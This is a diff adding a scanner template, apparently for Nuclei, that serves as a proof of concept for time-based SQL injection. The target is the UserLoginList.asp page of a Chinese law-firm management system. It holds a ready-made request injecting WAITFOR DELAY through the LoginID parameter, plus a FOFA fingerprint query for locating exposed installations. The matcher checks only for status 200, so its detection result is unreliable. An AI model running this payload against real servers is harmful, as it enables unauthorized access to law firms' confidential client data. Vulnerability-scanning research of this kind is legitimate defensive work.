@@ -1,0 +1,31 @@
+id: poc-byqt5a6g23i3f0x2
+info:
+  name: 必智律师事务所综合管理系统UserLoginList.asp 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/byqt5a6g23i3f0x2'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: byqt5a6g23i3f0x2
+    fofa: body="必智律师事务所综合信息管理系统"
+http:
+- raw:
+  - 'GET /system/UserLoginList.asp?LoginID=40%27%20;WAITFOR%20DELAY%20%270:0:3%27%20-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Content-Length: 54
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Connection: close
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
